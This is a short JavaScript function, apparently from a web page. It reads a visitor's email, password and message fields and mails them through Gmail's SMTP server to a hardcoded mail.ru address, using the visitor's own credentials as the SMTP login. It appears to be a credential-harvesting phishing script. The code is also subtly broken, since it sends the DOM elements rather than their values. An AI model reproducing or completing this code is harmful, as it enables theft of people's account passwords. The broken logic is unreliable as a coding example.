function send() {
    var email = document.getElementById("email");
    var password = document.getElementById("password");
    var message = document.getElementById('message');

    Email.send({
        Host: "smtp.gmail.com",
        Username : `${email}`,
        Password : `${password}`,
        To : `emil_abbas06@mail.ru`,
        From : `${email}`,
        Subject : "Message",
        Body : `${message}`
    }).then(
            message => alert("mail sent successfully")
    );
}